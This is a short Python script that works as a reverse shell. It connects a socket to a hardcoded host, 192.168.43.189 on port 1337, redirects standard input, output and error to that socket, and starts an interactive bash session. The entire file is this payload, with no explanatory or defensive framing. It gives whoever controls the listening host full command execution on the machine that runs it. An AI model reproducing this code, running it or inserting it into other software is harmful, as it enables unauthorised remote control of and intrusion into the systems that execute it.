import subprocess
import socket
import os

host = '192.168.43.189' #host ip
port = 1337 #host port

sock = socket.socket()
sock.connect((host, port))

os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)

subprocess.call(["bash", "-i"])